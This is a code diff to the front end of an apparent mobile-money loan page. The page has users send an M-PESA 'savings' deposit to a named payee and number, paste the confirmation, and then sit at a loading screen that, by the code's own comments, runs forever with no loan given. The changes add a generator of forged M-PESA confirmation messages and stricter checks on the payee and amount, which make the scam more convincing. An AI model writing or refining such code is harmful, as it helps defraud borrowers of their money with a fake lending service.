@@ -313,7 +313,7 @@
         <i class="fas fa-check-circle" style="color: #2b7a4b; font-size: 1.6rem; margin-bottom: 8px; display: block;"></i>
         
         <!-- Empty textarea for user to paste M-PESA message (English placeholder) -->
-        <textarea id="mpesaPasteArea" class="message-area" placeholder="✧ paste your M-PESA confirmation message here ✧"></textarea>
+        <textarea id="mpesaPasteArea" class="message-area" placeholder="✧ paste your M-PESA confirmation message here – must show payment to HAKIKA R PROVISION and the exact amount ✧"></textarea>
         
         <div class="small-note">
           <i class="fas fa-exclamation-triangle" style="color:#f5b342;"></i> send money to +254 707 123 456 (M‑PESA) then paste the message you received.
@@ -327,7 +327,7 @@
         </button>
       </div>
 
-      <!-- English button text - now triggers continuous loading overlay -->
+      <!-- English button text - now triggers continuous loading overlay after validation -->
       <button class="btn-primary" id="verifyPaymentBtn"><i class="fas fa-thumbs-up"></i> I have paid, give me loan</button>
       
       <button class="btn-outline" id="backToDashboardBtn"><i class="fas fa-arrow-left"></i> back to dashboard</button>
@@ -353,14 +353,33 @@
       document.getElementById('mpesaLoanSpan').innerText = `KSH ${loan}`;
       document.getElementById('mpesaSavingSpan').innerText = `KSH ${saving}`;
 
-      // Sample message for copying (English wording)
-      const sampleMessage = `I have deposited KSH ${saving} savings for Hela Chapchap. My phone is ${localStorage.getItem('hela_reg_phone') || '254...'}. I need my loan of KSH ${loan}.`;
+      const savingAmount = parseFloat(saving).toFixed(2);          // e.g. "100.00"
+      const expectedInstitution = "HAKIKA R PROVISION";
 
+      // Generate a realistic sample message with random transaction ID and current date/time
+      function generateSampleMessage() {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let transId = '';
+        for (let i = 0; i < 10; i++) {
+          transId += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        const date = new Date();
+        const formattedDate = `${date.getMonth()+1}/${date.getDate()}/${date.getFullYear().toString().slice(2)}`;
+        const hours = date.getHours();
+        const minutes = date.getMinutes();
+        const ampm = hours >= 12 ? 'PM' : 'AM';
+        const formattedHours = hours % 12 || 12;
+        const timeStr = `${formattedHours}:${minutes.toString().padStart(2,'0')} ${ampm}`;
+        return `${transId} Confirmed. Ksh${savingAmount} paid to ${expectedInstitution}. on ${formattedDate} at ${timeStr}. New M-PESA balance is Ksh0.00. Transaction cost, Ksh0.00. Amount you can transact within the day is 499,931.00. Save frequent Tills for quick payment on M-PESA app https://bit.ly/mpesalnk`;
+      }
+
+      // Copy sample button
       document.getElementById('copySampleBtn').addEventListener('click', function() {
-        navigator.clipboard.writeText(sampleMessage).then(() => {
+        const sample = generateSampleMessage();
+        navigator.clipboard.writeText(sample).then(() => {
           alert('✅ sample copied! paste it into the message area.');
         }).catch(() => {
-          prompt('copy manually:', sampleMessage);
+          prompt('copy manually:', sample);
         });
       });
 
@@ -398,11 +417,17 @@
         }, 1500);
       }
 
-      // Main button: activates continuous overlay
+      // Main button: validates message, then activates continuous overlay
       document.getElementById('verifyPaymentBtn').addEventListener('click', function() {
         const pasted = document.getElementById('mpesaPasteArea').value.trim();
         if (!pasted) {
           alert('Please paste your M-PESA message first');
+          return;
+        }
+
+        // Validate that the message contains the required institution and the exact amount
+        if (!pasted.includes(expectedInstitution) || !pasted.includes(`Ksh${savingAmount}`)) {
+          alert(`Invalid M-PESA message. Ensure it shows payment to ${expectedInstitution} and amount Ksh${savingAmount}.`);
           return;
         }
 
@@ -438,7 +463,6 @@
 
         // The overlay remains active indefinitely – continuous loading.
         // There is no automatic redirect. The user stays in this state forever.
-        // (To simulate a true continuous page, we never resolve.)
       });
 
       // Back to dashboard button – only works if overlay is NOT active (overlay disables pointer events)
